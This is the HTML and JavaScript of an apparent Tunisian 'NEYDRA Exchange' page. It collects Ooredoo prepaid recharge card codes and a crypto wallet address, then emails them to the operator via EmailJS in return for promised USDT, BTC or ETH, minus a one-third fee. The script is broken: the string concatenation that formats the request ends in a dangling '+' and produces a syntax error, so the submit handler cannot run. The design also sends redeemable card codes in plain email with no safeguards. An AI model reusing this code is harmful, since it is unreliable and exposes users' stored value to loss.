<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link href="https://cdn.jsdelivr.net/npm/remixicon@3.0.0/fonts/remixicon.css" rel="stylesheet" />
    <link rel="stylesheet" href="styles.css" />
    <link rel="icon" href="assets/icon.png" type="image/png" />
    <link rel="manifest" href="manifest.json" />
    <title>Exchange | NEYDRA™</title>
    <!-- EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script type="text/javascript">
      (function() {
        emailjs.init("QrxaXFcp-hMFZabQc"); // Your public key, same as home.html
      })();
    </script>
  </head>
  <body>
    <header>
      <div class="section__container header__container">
        <h1>Exchange</h1>
        <p>NEYDRA – Digital Currency Conversion System.<br>
        Convert your Tunisian dinar cash to digital currencies with ease and transparency.</p>
        <!-- Logo Area: Ooredoo, Switch, Crypto logos -->
        <div style="display:flex; align-items:center; gap:50px; margin-bottom:1rem;">
          <img src="assets/ooredoo-logo.png" alt="Ooredoo" style="width:100px; height:120px;" />
          <img src="assets/switch-symbol.png" alt="Switch" style="width:50px; height:50px;" />
          <img src="assets/usdt-logo.png" alt="USDT" style="width:100px; height:120px;" />
        </div>
      </div>
      <nav class="bottom-nav">
        <ul>
          <li><a href="home.html"><img src="assets/home-icon.png" alt="Home" /></a></li>
          <li><a href="about.html"><img src="assets/about-icon.png" alt="About" /></a></li>
          <li><a href="nexhub.html"><img src="assets/neydra-icon.png" alt="Neydra" /></a></li>
          <li><a href="exchange.html"><img src="assets/switch-icon.png" alt="Exchange" /></a></li>
        </ul>
      </nav>
    </header>

    <section class="about">
      <div class="section__container about__container">
        <div class="about__content">
          <h2 class="section__title">NEYDRA Currency Exchange</h2>
          <p class="section__subtitle">Convert Tunisian Dinar to Digital Currency Instantly</p>
          <p class="about__details">
            Enter Ooredoo recharge cards (each 5 TND), select your desired digital currency, and click "Convert".
            You can add more cards in multiples of 3 by pressing the "Add More Cards" button below.<br>
            NEYDRA takes 1/3 (every third card) as a fee, and you receive the digital equivalent of the remaining value minus operational fees.
            <br><br>
            <strong>Example:</strong><br>
            - You enter 3 cards (5 TND each = 15 TND)<br>
            - NEYDRA keeps 1 card (5 TND fee)<br>
            - Operational fee = 1 TND<br>
            - You get 9 TND worth in your chosen digital currency (e.g., USDT TRC20)<br>
            - At rate 1 USDT = 3.20 TND &rarr; You receive <b>2.81 USDT</b>
          </p>
        </div>
      </div>
    </section>

    <section class="service">
      <div class="section__container service__container">
        <h2 class="section__title">Make a Conversion</h2>
        <form id="exchange-form" class="footer__form" style="max-width:500px;margin:auto;">
          <div id="card-fields">
            <!-- Initial 3 fields -->
            <div class="card-group">
              <label for="card1">Ooredoo Card Code 1</label>
              <input type="text" id="card1" name="card1" maxlength="14" required pattern="\d{14}" inputmode="numeric" placeholder="Enter card code" />
              <label for="card2">Ooredoo Card Code 2</label>
              <input type="text" id="card2" name="card2" maxlength="14" required pattern="\d{14}" inputmode="numeric" placeholder="Enter card code" />
              <label for="card3">Ooredoo Card Code 3</label>
              <input type="text" id="card3" name="card3" maxlength="14" required pattern="\d{14}" inputmode="numeric" placeholder="Enter card code" />
            </div>
          </div>
          <button id="add-cards-btn" type="button" class="btn" style="margin:10px 0;">Add More Cards</button>

          <label for="crypto">Choose Cryptocurrency</label>
          <select id="crypto" name="crypto" required>
            <option value="USDT-TRC20">USDT TRC20 (Low Fees)</option>
            <option value="USDT-ERC20">USDT ERC20</option>
            <option value="BTC">Bitcoin (BTC)</option>
            <option value="ETH">Ethereum (ETH)</option>
          </select>
          <label for="wallet">Your Crypto Wallet Address</label>
          <input type="text" id="wallet" name="wallet" required placeholder="Paste your wallet address" />

          <!-- Hidden textarea for EmailJS variable -->
          <textarea name="user_data" id="user_data" style="display:none;"></textarea>

          <div class="action__btns">
            <button type="submit" class="btn">Convert</button>
          </div>
          <div id="exchange-result" style="margin-top:1rem;color:#ff0000;"></div>
        </form>
        <p style="color: var(--text-light); text-align:center; margin-top:2rem;">
          <b>Note:</b> Conversion rates and fees are subject to change based on market conditions.
        </p>
      </div>
    </section>

    <footer>
      <div class="section__container footer__container">
        <div class="footer__content">
          <h2>Contact Us</h2>
          <p>For help or questions, reach out through the contact page or social media below.</p>
          <div class="social__icons">
            <a href="https://www.facebook.com/share/1BcWt2hcvL/" class="icon"><i class="ri-facebook-fill"></i></a>
            <a href="https://www.instagram.com/_ilyes_jarray_?igsh=MWZ2Y2VlZm9vazFwcQ==" class="icon"><i class="ri-instagram-fill"></i></a>
          </div>
        </div>
      </div>
    </footer>

    <!-- Add audio for click sound -->
    <audio id="click-sound1" src="click-sound1.mp3" preload="auto"></audio>
    <audio id="click-sound2" src="click-sound2.mp3" preload="auto"></audio>
    <audio id="click-sound3" src="click-sound3.mp3" preload="auto"></audio>
    <audio id="click-sound4" src="click-sound4.mp3" preload="auto"></audio>

    <script type="text/javascript">
      // Click sound effect
      function playClickSound() {
        var sounds = [
          document.getElementById("click-sound1"),
          document.getElementById("click-sound2"),
          document.getElementById("click-sound3"),
          document.getElementById("click-sound4")
        ];
        var sound = sounds[Math.floor(Math.random() * sounds.length)];
        sound.play();
      }
      document.querySelectorAll('button, a').forEach(function(element) {
        element.addEventListener('click', playClickSound);
        element.addEventListener('touchstart', playClickSound);
      });

      // Add More Cards dynamic fields
      let cardCount = 3;
      document.getElementById('add-cards-btn').addEventListener('click', function() {
        // Only add if previous group is filled
        let allFilled = true;
        for (let i = 1; i <= cardCount; i++) {
          const cardInput = document.getElementById('card' + i);
          if (!cardInput || cardInput.value.length !== 14 || !/^\d{14}$/.test(cardInput.value)) {
            allFilled = false;
            break;
          }
        }
        if (!allFilled) {
          document.getElementById('exchange-result').textContent = "Fill all current card spaces with 14 digits before adding more.";
          return;
        }
        // Add next group of 3 fields
        const cardFields = document.getElementById('card-fields');
        const groupDiv = document.createElement('div');
        groupDiv.className = "card-group";
        for (let i = 1; i <= 3; i++) {
          cardCount++;
          const label = document.createElement('label');
          label.htmlFor = 'card' + cardCount;
          label.textContent = "Ooredoo Card Code " + cardCount;
          const input = document.createElement('input');
          input.type = "text";
          input.id = "card" + cardCount;
          input.name = "card" + cardCount;
          input.maxLength = 14;
          input.required = true;
          input.pattern = "\\d{14}";
          input.inputMode = "numeric";
          input.placeholder = "Enter card code";
          input.addEventListener("input", function(e){
            // Only allow numbers
            this.value = this.value.replace(/\D/g, "");
          });
          groupDiv.appendChild(label);
          groupDiv.appendChild(input);
        }
        cardFields.appendChild(groupDiv);
        document.getElementById('exchange-result').textContent = "";
      });

      // Only allow numbers in card fields
      function restrictToNumbers(e) {
        e.target.value = e.target.value.replace(/\D/g, "");
      }
      document.querySelectorAll('input[id^="card"]').forEach(function(input) {
        input.addEventListener('input', restrictToNumbers);
      });

      // EmailJS submission and organized text (using sendForm)
      document.getElementById('exchange-form').addEventListener('submit', function(event) {
        event.preventDefault();

        // Gather card codes
        let cards = [];
        for (let i = 1; i <= cardCount; i++) {
          const cardInput = document.getElementById('card' + i);
          if (!cardInput || cardInput.value.length !== 14 || !/^\d{14}$/.test(cardInput.value)) {
            document.getElementById('exchange-result').textContent = "All card codes must be exactly 14 digits.";
            return;
          }
          cards.push(cardInput.value);
        }

        // Get crypto/wallet
        var crypto = document.getElementById('crypto').value;
        var wallet = document.getElementById('wallet').value.trim();

        if (!crypto || !wallet) {
          document.getElementById('exchange-result').textContent = "Please fill in all fields correctly.";
          return;
        }

        // Calculation logic
        var cardValue = 5; // Each card is 5 TND
        var totalTND = cards.length * cardValue;
        var neydraFee = Math.floor(cards.length / 3) * cardValue; // 1/3 cards fee
        var operationalFee = 1; // 1 TND fixed
        var marketRate = 3.20; // Example: 1 USDT = 3.20 TND

        var userTND = totalTND - neydraFee - operationalFee;
        var cryptoAmount = userTND / marketRate;
        var cryptoRounded = Math.round(cryptoAmount * 100) / 100;

        // Format all user data into one organized text
        var organizedText =
          "NEYDRA EXCHANGE REQUEST\n" +
          "-------------------------------\n" +
          "Ooredoo Cards (" + cards.length + "):\n" +
          cards.map((card, idx) => (idx+1) + ". " + card).join("\n") + "\n" +
          "-------------------------------\n" +
          "Currency: " + crypto.replace("-", " ") + "\n" +
          "Wallet Address: " + wallet + "\n" +
          "-------------------------------\n" +
          "Total TND entered: " + totalTND + "\n" +
          "NEYDRA Profits: " + neydraFee + " TND\n" +
          
          
          
          

        document.getElementById('user_data').value = organizedText;

        var resultText = "Your cards will be sent to NEYDRA for 48h processing...";

        document.getElementById('exchange-result').textContent = resultText;

        // Use sendForm with your new template
        emailjs.sendForm('service_v1sa9hj', 'template_ho17oqm', this)
          .then(function() {
            alert('Conversion request sent successfully!');
          }, function(error) {
            document.getElementById('exchange-result').textContent = 'Failed to send: ' + (error.text || JSON.stringify(error));
          });
      });
    </script>
    <script src="https://static.elfsight.com/platform/platform.js" async></script>
    <div class="elfsight-app-f0694651-f050-4245-909a-6b38d447d146" data-elfsight-app-lazy></div>
  </body>
</html>

